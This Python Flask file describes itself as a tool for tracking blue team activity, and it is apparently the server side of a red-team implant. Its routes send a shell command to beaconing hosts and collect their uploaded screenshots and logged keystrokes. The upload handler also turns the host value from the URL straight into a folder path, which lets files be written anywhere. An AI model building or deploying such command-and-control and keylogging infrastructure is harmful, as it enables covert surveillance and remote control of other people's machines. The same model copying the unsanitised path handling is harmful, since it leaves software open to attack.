"""
A platform for tracking blue team activity
Author: Chris Vantine
"""
import os
from flask import request
from werkzeug.utils import secure_filename

# route functions flagged as unused, disabling warning for this function.
# Also disabling warning about catch-all excepts
# pylint: disable=W0612, W0702
def init(app, database):
    """ Initialize backend views """
    def allowed_file(filename):
        """
        checks if file is allowed
        """
        return '.' in filename and \
               filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

    @app.route("/conn/")
    def beacon_handler():
        """
        manage beaconing connections
        :return: command to run on reporter
        """
        return "whoami"

    @app.route("/screen/<host>/", methods=['POST'])
    def screenshot_handler(host):
        """
        Handler for screenshot uploads
        :param host: ip of reporter
        :return:  "invalid" if failed, "success" if successful
        """
        # set upload folder to hostname
        app.config['UPLOAD_FOLDER'] = host

        # attempt to save file to disk
        try:
            file = request.files['file']
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))

                # update database and return success
                database.add_file(host, filename)
                return "success"

            # fail if file type not allowed
            return "invalid"
        except:
            return "invalid"

    @app.route("/key/<host>/", methods=['POST'])
    def keylog_handler(host):
        """
        Handler for keylogger data, line by line
        :param host: ip of reporter
        :return: "invalid" if failed, "success" if successful
        """
        try:
            print("1")
            data = request.data
            print("2")
            database.add_keystroke(host, data)
            print("3")
            return "success"
        except:
            return "failed"
